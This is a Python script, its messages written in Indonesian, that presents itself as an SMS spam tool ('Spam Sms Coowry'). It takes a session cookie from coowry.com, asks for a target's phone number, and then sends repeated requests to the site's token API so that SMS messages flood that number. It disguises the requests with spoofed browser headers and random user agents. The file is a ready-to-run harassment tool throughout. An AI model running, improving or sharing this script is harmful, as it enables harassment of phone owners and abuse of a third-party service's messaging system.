# -*- coding: utf-8 -*-
import requests,json,time,os
from fake_useragent import UserAgent

uat = UserAgent()
r = requests.Session()
def tunggu(t):
        while t:
                wd='[#] Jeda selama '+str(t)+" detik "
                print(wd,end='\r',flush=True)
                time.sleep(1)
                t -= 1

ua = uat.random
url = 'https://www.coowry.com/arlethdesign'
spam = 'https://www.coowry.com/api/tokens'
hd = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-length": "28",
        "content-type": "application/json",
        "origin": "https://www.coowry.com",
        "referer": "https://www.coowry.com/arlethdesign",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": uat.random
}
if os.name == 'nt':os.system('cls')
else:os.system('clear')
print ("""\n ██████╗ ██████╗  ██████╗ ██╗    ██╗██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔═══██╗██║    ██║██╔══██╗╚██╗ ██╔╝
██║     ██║   ██║██║   ██║██║ █╗ ██║██████╔╝ ╚████╔╝ 
██║     ██║   ██║██║   ██║██║███╗██║██╔══██╗  ╚██╔╝  
╚██████╗╚██████╔╝╚██████╔╝╚███╔███╔╝██║  ██║   ██║   
 ╚═════╝ ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   
                                                     \n""")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms Coowry | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
try:
        a = r.get(url,headers={'user-agent':ua}).cookies
        no = input("[~] Contoh : +628xxx\n[•] Masukkan nomor target : ")
        target = {"msisdn":no}
        jsn = json.dumps(target)
        for i in range(5):
                b = r.post(spam,headers=hd,cookies={'_cwpeople_keyle_key':a["_cwpeople_key"]},data=jsn).text
                c = json.loads(b)["type"]
                if c == 'ok':
                        print("[√] >>> Sukses <<< Mengirim pesan ke >> "+no)
                        tunggu(30)
                else:
                        print("[!] Upss limit, ulangi lagi nanti")
                        exit()
except KeyboardInterrupt:
        print("[!] Bye, selamat tinggal, jangan di recode ye")
        exit()
except Exception as e:
        print("[!] [Error]",e)
